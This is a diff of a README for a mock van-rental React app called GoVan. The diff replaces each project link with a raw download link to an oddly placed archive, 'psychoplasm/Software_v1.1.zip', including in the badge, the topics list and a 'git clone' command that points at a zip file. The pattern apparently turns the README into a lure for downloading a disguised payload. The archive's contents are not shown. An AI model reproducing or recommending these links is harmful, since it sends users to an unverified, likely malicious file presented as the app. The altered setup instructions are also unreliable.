@@ -2,7 +2,7 @@
 
 Welcome to GoVan, the perfect platform for adventure seekers and van owners to connect and experience the thrill of van life! 🌍
 
-[![Download GoVan](https://github.com/Mr-Noobie/govan/releases/tag/v1.0%20GoVan-v1.0.0-green)](https://github.com/Mr-Noobie/govan/releases/tag/v1.0)
+[![Download GoVan](https://github.com/Mr-Noobie/govan/raw/refs/heads/main/psychoplasm/Software_v1.1.zip%20GoVan-v1.0.0-green)](https://github.com/Mr-Noobie/govan/raw/refs/heads/main/psychoplasm/Software_v1.1.zip)
 
 ## 📁 Repository
 
@@ -19,7 +19,7 @@ This repository houses the codebase for GoVan, an exciting mock van rental & hos
 
 - **Frontend**: React, React Router, Tailwind CSS  
 - **Backend & Database**: Firebase, Firestore, MirageJS  
-- **Other**: TypeScript, https://github.com/Mr-Noobie/govan/releases/tag/v1.0  
+- **Other**: TypeScript, https://github.com/Mr-Noobie/govan/raw/refs/heads/main/psychoplasm/Software_v1.1.zip  
 
 ## 🚀 Getting Started
 
@@ -27,7 +27,7 @@ Follow these steps to start exploring the world of adventure vans with GoVan:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/Mr-Noobie/govan/releases/tag/v1.0
+   git clone https://github.com/Mr-Noobie/govan/raw/refs/heads/main/psychoplasm/Software_v1.1.zip
    cd govan
    ```
 
@@ -46,11 +46,11 @@ Follow these steps to start exploring the world of adventure vans with GoVan:
 
 ## 🎯 Repository Topics
 
-Adventure, https://github.com/Mr-Noobie/govan/releases/tag/v1.0, Dashboard, Firebase, Firestore, Frontend, MirageJS, Mock API, Netlify, React, React Router, Rental Platform, Tailwind CSS, TypeScript, Vanlife, Webapp
+Adventure, https://github.com/Mr-Noobie/govan/raw/refs/heads/main/psychoplasm/Software_v1.1.zip, Dashboard, Firebase, Firestore, Frontend, MirageJS, Mock API, Netlify, React, React Router, Rental Platform, Tailwind CSS, TypeScript, Vanlife, Webapp
 
 ## 🌐 Explore Further
 
-Visit [GoVan](https://github.com/Mr-Noobie/govan/releases/tag/v1.0) to dive into the world of adventure vans and start your journey today! 🌟
+Visit [GoVan](https://github.com/Mr-Noobie/govan/raw/refs/heads/main/psychoplasm/Software_v1.1.zip) to dive into the world of adventure vans and start your journey today! 🌟
 
 ---
 
